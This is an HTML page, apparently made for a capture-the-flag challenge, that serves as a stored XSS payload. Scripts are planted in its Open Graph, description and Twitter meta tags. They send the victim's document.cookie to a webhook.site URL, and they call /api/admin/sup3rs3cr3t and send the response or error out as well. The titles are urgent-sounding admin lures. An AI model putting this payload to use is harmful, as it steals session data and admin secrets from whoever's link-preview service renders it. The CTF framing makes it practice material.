<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Trang Tải XSS Payload - Direct Flag Attempt</title>

    <meta property="og:title" content="Cập nhật Hệ thống Khẩn cấp">
    
    <meta property="og:description" content="
        <script>
            (function() {
                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a'; // ID Webhook của bạn
                var webhook_base_url = 'https://webhook.site/';
                var attacker_url = webhook_base_url + webhook_id;

                function sendToWebhook(data) {
                    var params = new URLSearchParams();
                    for (var key in data) {
                        if (data.hasOwnProperty(key)) {
                            params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                        }
                    }
                    new Image().src = attacker_url + '?' + params.toString();
                }

                // Gửi cookie hiện tại để debug (dù có thể không có session cookie do HttpOnly)
                sendToWebhook({ 
                    stage: 'initial_debug', 
                    current_document_cookie: document.cookie || 'empty' 
                });

                // Thử gọi trực tiếp /api/admin/sup3rs3cr3t
                fetch('/api/admin/sup3rs3cr3t', {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest' // Thường cần cho các request AJAX trong Laravel
                    }
                })
                .then(response => {
                    if (!response.ok) {
                        // Nếu có lỗi, lấy status và text để debug
                        return response.text().then(text => {
                            throw { 
                                status: response.status, 
                                statusText: response.statusText, 
                                body: text 
                            };
                        });
                    }
                    return response.json(); // Nếu OK, parse JSON
                })
                .then(data => {
                    // Gửi toàn bộ response data (chứa FLAG_2 nếu thành công) về webhook
                    sendToWebhook({ 
                        stage: 'sup3rs3cr3t_success', 
                        flag_data: data 
                    });
                })
                .catch(error => {
                    // Gửi thông tin lỗi về webhook
                    sendToWebhook({ 
                        stage: 'sup3rs3cr3t_error', 
                        error_details: error 
                    });
                });

            })();
        </script>
    ">

    <!-- Các thẻ meta khác để tăng khả năng được parse -->
    <meta name="description" content="
        <script>
            /* Lặp lại payload tương tự nếu muốn hoặc để trống nếu og:description được ưu tiên */
            (function() {
                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                var webhook_base_url = 'https://webhook.site/';
                var attacker_url = webhook_base_url + webhook_id;
                fetch('/api/admin/sup3rs3cr3t', { /* ... giống trên ... */ })
                .then(r => r.json().then(d => new Image().src = attacker_url + '?from_name_description_data=' + JSON.stringify(d)))
                .catch(e => new Image().src = attacker_url + '?from_name_description_error=' + JSON.stringify(e));
            })();
        </script>
    ">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Cần Xác Thực Admin Gấp">
    <meta name="twitter:description" content="
        <script>
            /* Lặp lại payload tương tự nếu muốn */
            (function() {
                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                var webhook_base_url = 'https://webhook.site/';
                var attacker_url = webhook_base_url + webhook_id;
                fetch('/api/admin/sup3rs3cr3t', { /* ... giống trên ... */ })
                .then(r => r.json().then(d => new Image().src = attacker_url + '?from_twitter_description_data=' + JSON.stringify(d)))
                .catch(e => new Image().src = attacker_url + '?from_twitter_description_error=' + JSON.stringify(e));
            })();
        </script>
    ">

</head>
<body>
    <h1>Trang Web Chứa Payload XSS - Nỗ Lực Lấy Flag Trực Tiếp</h1>
    <p>Script trong các thẻ meta sẽ cố gắng gọi /api/admin/sup3rs3cr3t và gửi kết quả về webhook.</p>
</body>
</html>
